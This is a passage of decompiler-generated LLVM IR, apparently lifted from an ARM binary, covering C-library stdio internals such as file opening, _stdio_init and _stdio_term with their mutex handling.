  store i32 %v2_10de0, i32* %r3.global-to-local, align 4
  %v9_10de4 = icmp eq i32 %v2_10de0, %v1_10dd8
  store i1 %v9_10de4, i1* %cpsr_z.global-to-local, align 1
  %v1_10de8 = load i32, i32* @r8, align 4
  %v2_10de8 = add i32 %v1_10de8, 4
  %v3_10de8 = inttoptr i32 %v2_10de8 to i32*
  store i32 %v0_10e20, i32* %v3_10de8, align 4
  br i1 %v9_10de4, label %dec_label_pc_10df0, label %dec_label_pc_10d44

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10dd0
  %v0_10df0 = load i32, i32* @r4, align 4
  %v1_10df0 = load i32, i32* @r6, align 4
  %v2_10df0 = sub i32 -1, %v1_10df0
  %v3_10df0 = and i32 %v0_10df0, %v2_10df0
  store i32 %v3_10df0, i32* %r3.global-to-local, align 4
  %v1_10df4 = and i32 %v3_10df0, 1024
  %v2_10df4 = icmp eq i32 %v1_10df4, 0
  store i1 %v2_10df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10df4, label %dec_label_pc_10e14, label %dec_label_pc_10dfc

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10df0
  %v0_10dfc = load i32, i32* @r5, align 4
  store i32 %v0_10dfc, i32* @r0, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_10e08 = call i32 @__libc_fcntl(i32 %v0_10dfc, i32 4)
  store i32 %v2_10e08, i32* %r0.global-to-local, align 4
  %v2_10e0c = icmp eq i32 %v2_10e08, 0
  store i1 %v2_10e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e0c, label %dec_label_pc_10dfc.dec_label_pc_10e14_crit_edge, label %dec_label_pc_10d44

dec_label_pc_10dfc.dec_label_pc_10e14_crit_edge:  ; preds = %dec_label_pc_10dfc
  %v0_10e14.pre = load i32, i32* @r6, align 4
  %v0_10e18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10e14

dec_label_pc_10e14:                               ; preds = %dec_label_pc_10dfc.dec_label_pc_10e14_crit_edge, %dec_label_pc_10df0
  %v0_10e18 = phi i32 [ %v0_10e18.pre, %dec_label_pc_10dfc.dec_label_pc_10e14_crit_edge ], [ %v0_10df0, %dec_label_pc_10df0 ]
  %v0_10e14 = phi i32 [ %v0_10e14.pre, %dec_label_pc_10dfc.dec_label_pc_10e14_crit_edge ], [ %v1_10df0, %dec_label_pc_10df0 ]
  %v1_10e14 = and i32 %v0_10e14, 131072
  store i32 %v1_10e14, i32* %r3.global-to-local, align 4
  %v2_10e18 = or i32 %v1_10e14, %v0_10e18
  store i32 %v2_10e18, i32* @r4, align 4
  br label %dec_label_pc_10e44

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10dc8
  %v7_10e20 = icmp eq i32 %v0_10e20, -1
  store i1 %v7_10e20, i1* %cpsr_z.global-to-local, align 1
  %v0_10e2c.pre = load i32, i32* @r4, align 4
  br i1 %v7_10e20, label %dec_label_pc_10e20._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_10e20
  %v2_10e24 = or i32 %v0_10e2c.pre, 131072
  store i32 %v2_10e24, i32* @r4, align 4
  br label %dec_label_pc_10e20._crit_edge

dec_label_pc_10e20._crit_edge:                    ; preds = %dec_label_pc_10e20, %bb34
  %v0_10e2c = phi i32 [ %v2_10e24, %bb34 ], [ %v0_10e2c.pre, %dec_label_pc_10e20 ]
  %v0_10e28 = load i32, i32* @r6, align 4
  store i32 %v0_10e28, i32* @r0, align 4
  store i32 %v0_10e2c, i32* %r1.global-to-local, align 4
  store i32 438, i32* %r2.global-to-local, align 4
  %v2_10e34 = call i32 @__libc_open(i32 %v0_10e28, i32 %v0_10e2c)
  store i32 %v2_10e34, i32* %r0.global-to-local, align 4
  %v1_10e38 = icmp slt i32 %v2_10e34, 0
  %v2_10e38 = icmp eq i32 %v2_10e34, 0
  store i1 %v2_10e38, i1* %cpsr_z.global-to-local, align 1
  %v1_10e3c = load i32, i32* @r8, align 4
  %v2_10e3c = add i32 %v1_10e3c, 4
  %v3_10e3c = inttoptr i32 %v2_10e3c to i32*
  store i32 %v2_10e34, i32* %v3_10e3c, align 4
  br i1 %v1_10e38, label %dec_label_pc_10d58, label %dec_label_pc_10e44

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e20._crit_edge, %dec_label_pc_10e14
  %v0_10e44 = load i32, i32* @r8, align 4
  %v1_10e44 = inttoptr i32 %v0_10e44 to i32*
  %v2_10e44 = load i32, i32* %v1_10e44, align 4
  %v1_10e48 = and i32 %v2_10e44, 8192
  store i32 %v1_10e48, i32* %r3.global-to-local, align 4
  %v3_10e4c1 = udiv i32 %v1_10e48, 256
  store i32 %v3_10e4c1, i32* %r2.global-to-local, align 4
  %v1_10e50 = trunc i32 %v3_10e4c1 to i8
  %v3_10e50 = add i32 %v0_10e44, 1
  %v4_10e50 = inttoptr i32 %v3_10e50 to i8*
  store i8 %v1_10e50, i8* %v4_10e50, align 1
  %v0_10e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e54 = trunc i32 %v0_10e54 to i8
  %v2_10e54 = load i32, i32* @r8, align 4
  %v3_10e54 = inttoptr i32 %v2_10e54 to i8*
  store i8 %v1_10e54, i8* %v3_10e54, align 1
  %v0_10e58 = load i32, i32* @r4, align 4
  %v1_10e58 = and i32 %v0_10e58, 131072
  store i32 %v1_10e58, i32* %r1.global-to-local, align 4
  %v2_10e58 = icmp eq i32 %v1_10e58, 0
  store i1 %v2_10e58, i1* %cpsr_z.global-to-local, align 1
  %v0_10e5c = load i32, i32* @r8, align 4
  %v1_10e5c = add i32 %v0_10e5c, 1
  %v2_10e5c = inttoptr i32 %v1_10e5c to i8*
  %v3_10e5c = load i8, i8* %v2_10e5c, align 1
  %v4_10e5c = zext i8 %v3_10e5c to i32
  %v1_10e60 = inttoptr i32 %v0_10e5c to i8*
  %v2_10e60 = load i8, i8* %v1_10e60, align 1
  %v3_10e60 = zext i8 %v2_10e60 to i32
  store i32 %v3_10e60, i32* %r3.global-to-local, align 4
  br i1 %v2_10e58, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_10e44
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_10e44, %bb35
  %v0_10e74 = phi i32 [ 0, %dec_label_pc_10e44 ], [ 32768, %bb35 ]
  %v1_10e68 = and i32 %v0_10e58, 1024
  store i32 %v1_10e68, i32* %r0.global-to-local, align 4
  %v4_10e70 = mul nuw nsw i32 %v4_10e5c, 256
  %v5_10e70 = or i32 %v3_10e60, %v4_10e70
  %v2_10e74 = or i32 %v0_10e74, %v1_10e68
  store i32 %v2_10e74, i32* %r1.global-to-local, align 4
  %v2_10e7c = or i32 %v5_10e70, %v2_10e74
  %v1_10e6c = mul i32 %v0_10e58, 16
  %v1_10e78 = and i32 %v1_10e6c, 48
  %v1_10e80 = add nuw nsw i32 %v1_10e78, 16
  %v4_10e84 = xor i32 %v1_10e80, 48
  %v5_10e84 = or i32 %v2_10e7c, %v4_10e84
  store i32 %v5_10e84, i32* %r3.global-to-local, align 4
  %v3_10e8819 = udiv i32 %v2_10e7c, 256
  store i32 %v3_10e8819, i32* %r2.global-to-local, align 4
  %v1_10e8c = trunc i32 %v3_10e8819 to i8
  store i8 %v1_10e8c, i8* %v2_10e5c, align 1
  %v0_10e90 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e90 = trunc i32 %v0_10e90 to i8
  %v2_10e90 = load i32, i32* @r8, align 4
  %v3_10e90 = inttoptr i32 %v2_10e90 to i8*
  store i8 %v1_10e90, i8* %v3_10e90, align 1
  %v0_10e94 = call i32 @__errno_location()
  store i32 %v0_10e94, i32* %r0.global-to-local, align 4
  %v0_10e98 = load i32, i32* @r8, align 4
  %v1_10e98 = add i32 %v0_10e98, 1
  %v2_10e98 = inttoptr i32 %v1_10e98 to i8*
  %v3_10e98 = load i8, i8* %v2_10e98, align 1
  %v4_10e98 = zext i8 %v3_10e98 to i32
  store i32 %v4_10e98, i32* %r3.global-to-local, align 4
  %v1_10e9c = inttoptr i32 %v0_10e98 to i8*
  %v2_10e9c = load i8, i8* %v1_10e9c, align 1
  %v3_10e9c = zext i8 %v2_10e9c to i32
  store i32 %v0_10e94, i32* @r6, align 4
  %v1_10ea4 = add i32 %v0_10e98, 4
  %v2_10ea4 = inttoptr i32 %v1_10ea4 to i32*
  %v3_10ea4 = load i32, i32* %v2_10ea4, align 4
  store i32 %v3_10ea4, i32* @r0, align 4
  %v4_10ea8 = mul nuw nsw i32 %v4_10e98, 256
  %v5_10ea8 = or i32 %v3_10e9c, %v4_10ea8
  store i32 %v5_10ea8, i32* @r4, align 4
  %v1_10eac = inttoptr i32 %v0_10e94 to i32*
  %v2_10eac = load i32, i32* %v1_10eac, align 4
  store i32 %v2_10eac, i32* @r5, align 4
  %v1_10eb0 = call i32 @isatty(i32 %v3_10ea4)
  store i32 %v1_10eb0, i32* %r0.global-to-local, align 4
  %v0_10eb4 = load i32, i32* @r4, align 4
  %v4_10eb4 = mul i32 %v1_10eb0, 256
  %v5_10eb4 = or i32 %v0_10eb4, %v4_10eb4
  store i32 %v5_10eb4, i32* @r4, align 4
  %v3_10eb8 = sdiv i32 %v5_10eb4, 256
  store i32 %v3_10eb8, i32* %r3.global-to-local, align 4
  %v1_10ebc = trunc i32 %v3_10eb8 to i8
  %v2_10ebc = load i32, i32* @r8, align 4
  %v3_10ebc = add i32 %v2_10ebc, 1
  %v4_10ebc = inttoptr i32 %v3_10ebc to i8*
  store i8 %v1_10ebc, i8* %v4_10ebc, align 1
  %v0_10ec0 = load i32, i32* @r4, align 4
  %v1_10ec0 = trunc i32 %v0_10ec0 to i8
  %v2_10ec0 = load i32, i32* @r8, align 4
  %v3_10ec0 = inttoptr i32 %v2_10ec0 to i8*
  store i8 %v1_10ec0, i8* %v3_10ec0, align 1
  %v0_10ec4 = load i32, i32* @r5, align 4
  %v1_10ec4 = load i32, i32* @r6, align 4
  %v2_10ec4 = inttoptr i32 %v1_10ec4 to i32*
  store i32 %v0_10ec4, i32* %v2_10ec4, align 4
  %v0_10ec8 = load i32, i32* @r8, align 4
  %v1_10ec8 = add i32 %v0_10ec8, 8
  %v2_10ec8 = inttoptr i32 %v1_10ec8 to i32*
  %v3_10ec8 = load i32, i32* %v2_10ec8, align 4
  store i32 %v3_10ec8, i32* %r3.global-to-local, align 4
  %v2_10ecc = icmp eq i32 %v3_10ec8, 0
  store i1 %v2_10ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ecc, label %dec_label_pc_10ed4, label %bb37

dec_label_pc_10ed4:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_10ed8 = call i32 @malloc(i32 4096)
  store i32 %v1_10ed8, i32* %r0.global-to-local, align 4
  %v2_10edc = icmp eq i32 %v1_10ed8, 0
  store i1 %v2_10edc, i1* %cpsr_z.global-to-local, align 1
  %v1_10ef0.pre = load i32, i32* @r8, align 4
  br i1 %v2_10edc, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_10ed4
  %v2_10ef020 = add i32 %v1_10ef0.pre, 8
  %v3_10ef021 = inttoptr i32 %v2_10ef020 to i32*
  store i32 0, i32* %v3_10ef021, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_10ed4
  %v2_10ee0 = inttoptr i32 %v1_10ef0.pre to i32*
  %v3_10ee0 = load i32, i32* %v2_10ee0, align 4
  %v2_10ee4 = or i32 %v3_10ee0, 16384
  store i32 %v2_10ee4, i32* %r3.global-to-local, align 4
  %v2_10ee8 = add i32 %v1_10ed8, 4096
  store i32 %v2_10ee8, i32* %r2.global-to-local, align 4
  %v4_10eec = sdiv i32 %v2_10ee4, 256
  store i32 %v4_10eec, i32* %r1.global-to-local, align 4
  %v2_10ef0 = add i32 %v1_10ef0.pre, 8
  %v3_10ef0 = inttoptr i32 %v2_10ef0 to i32*
  store i32 %v1_10ed8, i32* %v3_10ef0, align 4
  %v1_10ef4 = load i32, i32* %r2.global-to-local, align 4
  %v2_10ef4 = load i32, i32* @r8, align 4
  %v3_10ef4 = add i32 %v2_10ef4, 12
  %v4_10ef4 = inttoptr i32 %v3_10ef4 to i32*
  store i32 %v1_10ef4, i32* %v4_10ef4, align 4
  %v1_10ef8 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ef8 = trunc i32 %v1_10ef8 to i8
  %v3_10ef8 = load i32, i32* @r8, align 4
  %v4_10ef8 = add i32 %v3_10ef8, 1
  %v5_10ef8 = inttoptr i32 %v4_10ef8 to i8*
  store i8 %v2_10ef8, i8* %v5_10ef8, align 1
  %v0_10efc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10efc.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_10efc = load i32, i32* %r3.global-to-local, align 4
  %v2_10efc = trunc i32 %v1_10efc to i8
  %v3_10efc = load i32, i32* @r8, align 4
  %v4_10efc = inttoptr i32 %v3_10efc to i8*
  store i8 %v2_10efc, i8* %v4_10efc, align 1
  %v0_10f00.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f00.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_10f00 = load i32, i32* @r8, align 4
  %v3_10f00 = add i32 %v2_10f00, 12
  %v4_10f00 = inttoptr i32 %v3_10f00 to i32*
  store i32 %v1_10ed8, i32* %v4_10f00, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a8d0.387 to i32), i32* %r3.global-to-local, align 4
  %v2_10f0c = load i32, i32* @r8, align 4
  %v3_10f0c = add i32 %v2_10f0c, 2
  %v4_10f0c = inttoptr i32 %v3_10f0c to i8*
  store i8 0, i8* %v4_10f0c, align 1
  %v0_10f10 = load i32, i32* @r8, align 4
  %v1_10f10 = add i32 %v0_10f10, 1
  %v2_10f10 = inttoptr i32 %v1_10f10 to i8*
  %v3_10f10 = load i8, i8* %v2_10f10, align 1
  %v4_10f10 = zext i8 %v3_10f10 to i32
  store i32 %v4_10f10, i32* %r2.global-to-local, align 4
  %v2_10f14 = load i32, i32* @global_var_2a8d0.387, align 4
  store i32 %v2_10f14, i32* %r1.global-to-local, align 4
  %v1_10f18 = add i32 %v0_10f10, 8
  %v2_10f18 = inttoptr i32 %v1_10f18 to i32*
  %v3_10f18 = load i32, i32* %v2_10f18, align 4
  store i32 %v3_10f18, i32* %r3.global-to-local, align 4
  %v1_10f1c = and i32 %v4_10f10, 32
  %v2_10f1c = icmp eq i32 %v1_10f1c, 0
  store i1 %v2_10f1c, i1* %cpsr_z.global-to-local, align 1
  %v2_10f20 = add i32 %v0_10f10, 20
  %v3_10f20 = inttoptr i32 %v2_10f20 to i32*
  store i32 %v3_10f18, i32* %v3_10f20, align 4
  %v0_10f24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10f24 = load i32, i32* @r8, align 4
  %v2_10f24 = add i32 %v1_10f24, 44
  %v3_10f24 = inttoptr i32 %v2_10f24 to i32*
  store i32 %v0_10f24, i32* %v3_10f24, align 4
  %v0_10f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_10f28 = load i32, i32* @r8, align 4
  %v2_10f28 = add i32 %v1_10f28, 52
  %v3_10f28 = inttoptr i32 %v2_10f28 to i32*
  store i32 %v0_10f28, i32* %v3_10f28, align 4
  %v0_10f2c = load i32, i32* %r3.global-to-local, align 4
  %v1_10f2c = load i32, i32* @r8, align 4
  %v2_10f2c = add i32 %v1_10f2c, 24
  %v3_10f2c = inttoptr i32 %v2_10f2c to i32*
  store i32 %v0_10f2c, i32* %v3_10f2c, align 4
  %v0_10f30 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f30 = load i32, i32* @r8, align 4
  %v2_10f30 = add i32 %v1_10f30, 28
  %v3_10f30 = inttoptr i32 %v2_10f30 to i32*
  store i32 %v0_10f30, i32* %v3_10f30, align 4
  %v0_10f34 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f34 = load i32, i32* @r8, align 4
  %v2_10f34 = add i32 %v1_10f34, 16
  %v3_10f34 = inttoptr i32 %v2_10f34 to i32*
  store i32 %v0_10f34, i32* %v3_10f34, align 4
  br i1 %v2_10f1c, label %dec_label_pc_10fc8, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %bb37
  %v2_10f3c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10f3c, i32* @r7, align 4
  store i32 %v2_10f3c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* @r2, align 4
  store i32 58060, i32* @r4, align 4
  %v1_10f54 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* %r0.global-to-local, align 4
  %v2_10f64 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8b8.557 to i32))
  store i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), i32* @r2, align 4
  store i32 %v2_10d18, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  %v1_10f78 = call i32 @__pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), i32* %r0.global-to-local, align 4
  %v2_10f84 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8a0.575 to i32))
  store i32 ptrtoint (i32** @global_var_2a89c.382 to i32), i32* %r2.global-to-local, align 4
  %v2_10f8c = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  store i32 %v2_10f8c, i32* %r3.global-to-local, align 4
  store i32 %v2_10d18, i32* @r0, align 4
  %v1_10f94 = load i32, i32* @r8, align 4
  %v2_10f94 = add i32 %v1_10f94, 32
  %v3_10f94 = inttoptr i32 %v2_10f94 to i32*
  store i32 %v2_10f8c, i32* %v3_10f94, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* @r4, align 4
  %v0_10fa0 = load i32, i32* @r8, align 4
  %v1_10fa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_10fa0 = inttoptr i32 %v1_10fa0 to i32*
  store i32 %v0_10fa0, i32* %v2_10fa0, align 4
  store i32 69548, i32* @lr, align 4
  %v1_10fa8 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v2_10f3c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 69568, i32* @lr, align 4
  %v1_10fbc = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_10fbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10d58, %dec_label_pc_10d44, %dec_label_pc_10d64
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %bb37, %dec_label_pc_10d9c, %dec_label_pc_10f3c, %dec_label_pc_10fc4
  %v0_10fc8 = load i32, i32* @r8, align 4
  store i32 %v0_10fc8, i32* %r0.global-to-local, align 4
  %v2_10fd0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10fd0, i32* @r4, align 4
  store i32 %v6_10d0c, i32* @r5, align 4
  store i32 %v9_10d0c, i32* @r6, align 4
  store i32 %v12_10d0c, i32* @r7, align 4
  store i32 %v15_10d0c, i32* @r8, align 4
  ret i32 %v0_10fc8

; uselistorder directives
  uselistorder i32 %v1_10ef0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_10ed8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_10eb8, { 1, 0 }
  uselistorder i32 %v3_10e4c1, { 1, 0 }
  uselistorder i32 %v0_10e2c, { 1, 0 }
  uselistorder i1 %v7_10e20, { 1, 0 }
  uselistorder i32 %v1_10df0, { 1, 0 }
  uselistorder i32 %v0_10df0, { 1, 0 }
  uselistorder i32 %v1_10dd8, { 1, 0, 2 }
  uselistorder i32 %v1_10d8c, { 1, 0 }
  uselistorder i1 %v7_10d38, { 1, 0 }
  uselistorder i1 %v7_10d2c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 11, 12, 13, 15, 14, 16, 17 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 131072, { 1, 2, 3, 0 }
  uselistorder i8 98, { 1, 0 }
  uselistorder label %dec_label_pc_10fc8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10fc4, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_10e20._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10dc8, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_10d74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10d44, { 1, 2, 0 }
}

define i32 @"$d.13"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10fd4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_10fd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10fd4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10fd4
  %v3_10fdc = and i32 %arg4, %arg3
  store i32 %v3_10fdc, i32* %r0.global-to-local, align 4
  %v2_10fe0 = trunc i32 %v3_10fdc to i16
  %v4_10fe0 = inttoptr i32 %v3_10fdc to i16*
  store i16 %v2_10fe0, i16* %v4_10fe0, align 2
  %v5_10fe0 = load i32, i32* @r6, align 4
  %v6_10fe0 = load i32, i32* %r0.global-to-local, align 4
  %v7_10fe0 = sub i32 %v6_10fe0, %v5_10fe0
  store i32 %v7_10fe0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10fd4, %bb
  %v8_10fe0 = phi i32 [ %tmp, %dec_label_pc_10fd4 ], [ %v7_10fe0, %bb ]
  ret i32 %v8_10fe0

; uselistorder directives
  uselistorder i32 %v3_10fdc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11004 = load i32, i32* @r4, align 4
  store i32 %v3_11004, i32* %stack_var_-24, align 4
  %v6_11004 = load i32, i32* @r5, align 4
  %v9_11004 = load i32, i32* @r6, align 4
  %v12_11004 = load i32, i32* @r7, align 4
  %v0_11008 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_2a8d4.381 to i32), i32* @r4, align 4
  %v3_11010 = load i8, i8* @global_var_2a8d5.580, align 1
  %v4_11010 = zext i8 %v3_11010 to i32
  %v2_11014 = load i8, i8* bitcast (i8** @global_var_2a8d4.381 to i8*), align 4
  %v3_11014 = zext i8 %v2_11014 to i32
  store i32 %v0_11008, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_11020 = mul nuw nsw i32 %v4_11010, 256
  %v5_11020 = or i32 %v3_11014, %v4_11020
  store i32 %v5_11020, i32* @r6, align 4
  %v1_11024 = inttoptr i32 %v0_11008 to i32*
  %v2_11024 = load i32, i32* %v1_11024, align 4
  store i32 %v2_11024, i32* %r8.global-to-local, align 4
  %v1_11028 = call i32 @isatty(i32 0)
  %v1_1102c = sub i32 1, %v1_11028
  %v0_11030 = load i32, i32* @r6, align 4
  %v4_11030 = mul i32 %v1_1102c, 256
  %v5_11030 = xor i32 %v4_11030, %v0_11030
  %v3_11034 = load i8, i8* @global_var_2a925.581, align 1
  %v4_11034 = zext i8 %v3_11034 to i32
  %v3_11038 = load i8, i8* @global_var_2a924.551, align 1
  %v4_11038 = zext i8 %v3_11038 to i32
  %v3_1103c = sdiv i32 %v5_11030, 256
  store i32 1, i32* @r0, align 4
  %v4_11044 = mul nuw nsw i32 %v4_11034, 256
  %v5_11044 = or i32 %v4_11038, %v4_11044
  store i32 %v5_11044, i32* @r5, align 4
  %v1_11048 = trunc i32 %v3_1103c to i8
  store i8 %v1_11048, i8* @global_var_2a8d5.580, align 1
  %v1_1104c = trunc i32 %v0_11030 to i8
  %v2_1104c = load i32, i32* @r4, align 4
  %v3_1104c = inttoptr i32 %v2_1104c to i8*
  store i8 %v1_1104c, i8* %v3_1104c, align 1
  %v1_11050 = call i32 @isatty(i32 1)
  %v1_11054 = sub i32 1, %v1_11050
  %v0_11058 = load i32, i32* @r5, align 4
  %v4_11058 = mul i32 %v1_11054, 256
  %v5_11058 = xor i32 %v4_11058, %v0_11058
  store i32 %v5_11058, i32* %r5.global-to-local, align 4
  %v3_1105c = sdiv i32 %v5_11058, 256
  %v1_11060 = trunc i32 %v3_1105c to i8
  store i8 %v1_11060, i8* @global_var_2a925.581, align 1
  %v0_11064 = load i32, i32* %r8.global-to-local, align 4
  %v1_11064 = load i32, i32* @r7, align 4
  %v2_11064 = inttoptr i32 %v1_11064 to i32*
  store i32 %v0_11064, i32* %v2_11064, align 4
  %v0_11068 = load i32, i32* %r5.global-to-local, align 4
  %v1_11068 = trunc i32 %v0_11068 to i8
  store i8 %v1_11068, i8* @global_var_2a924.551, align 1
  %v2_1106c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1106c, i32* @r4, align 4
  store i32 %v6_11004, i32* @r5, align 4
  store i32 %v9_11004, i32* @r6, align 4
  store i32 %v12_11004, i32* @r7, align 4
  ret i32 %v1_11054

; uselistorder directives
  uselistorder i32 %v1_11054, { 1, 0 }
  uselistorder i32 %v0_11030, { 1, 0 }
  uselistorder i8* @global_var_2a924.551, { 1, 0 }
  uselistorder i8* @global_var_2a925.581, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_2a8d5.580, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1ca00.583 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_1107c = call i32 @memcpy()
  %v0_11080 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11080, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_1107c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11084 = load i32, i32* @r4, align 4
  store i32 %v3_11084, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), i32* @r0, align 4
  %v0_1108c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* @r0, align 4
  %v0_11094 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_2a89c.382 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_110f06 = add i32 %storemerge5, 56
  store i32 %v1_110f06, i32* @r5, align 4
  %v2_110f48 = icmp eq i32 %storemerge5, 0
  store i32 %v1_110f06, i32* %r0.global-to-local, align 4
  br i1 %v2_110f48, label %dec_label_pc_11100, label %dec_label_pc_110a4

dec_label_pc_110a4:                               ; preds = %entry, %dec_label_pc_110e0
  %v1_110ac = phi i32 [ %v1_110f0, %dec_label_pc_110e0 ], [ %v1_110f06, %entry ]
  store i32 ptrtoint (i32* @global_var_f790.588 to i32), i32* %r3.global-to-local, align 4
  store i32 69808, i32* @lr, align 4
  %v2_110ac = call i32 @pthread_mutex_trylock(i32 %v1_110ac)
  %v2_110b0 = icmp eq i32 %v2_110ac, 0
  %v0_110b4 = load i32, i32* @r5, align 4
  store i32 %v0_110b4, i32* @r0, align 4
  br i1 %v2_110b0, label %dec_label_pc_110e0, label %dec_label_pc_110bc

dec_label_pc_110bc:                               ; preds = %dec_label_pc_110a4
  %v0_110bc = load i32, i32* @r4, align 4
  %v1_110bc = add i32 %v0_110bc, 8
  %v2_110bc = inttoptr i32 %v1_110bc to i32*
  %v3_110bc = load i32, i32* %v2_110bc, align 4
  store i32 %v3_110bc, i32* %r3.global-to-local, align 4
  %v3_110c4 = inttoptr i32 %v0_110bc to i8*
  store i8 48, i8* %v3_110c4, align 1
  %v2_110cc = load i32, i32* @r4, align 4
  %v3_110cc = add i32 %v2_110cc, 1
  %v4_110cc = inttoptr i32 %v3_110cc to i8*
  store i8 0, i8* %v4_110cc, align 1
  %v0_110d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_110d0 = load i32, i32* @r4, align 4
